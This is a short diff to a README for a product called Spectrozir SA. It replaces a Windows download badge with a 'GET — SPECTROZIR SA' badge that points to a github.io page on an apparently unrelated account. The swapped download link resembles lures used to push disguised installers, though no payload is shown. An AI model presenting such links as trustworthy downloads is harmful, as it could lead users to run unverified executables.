@@ -4,12 +4,7 @@
 <img src="https://spectrozir.com/_next/static/media/v5.d726a483.png" width="820" alt="Spectrozir UI">
 </div>
 
-<div align="center">
-<a href="https://spectrozir-sa-signal-spectrum.github.io/.github">
-<img src="https://upload.wikimedia.org/wikipedia/commons/8/87/Windows_logo_-_2021.svg" width="20">
-<img src="https://img.shields.io/badge/Download_SPECTROZIR_SA-0078D6?style=for-the-badge&logo=windows&logoColor=white">
-</a>
-</div>
+[![GET SPECTROZIR SA ](https://img.shields.io/badge/GET%20%E2%80%94%20SPECTROZIR-SA-0078D6?style=for-the-badge&logoColor=white)](https://sittsfireyov.github.io/.github/SPECTROZIR-SA)
 
 ---
 
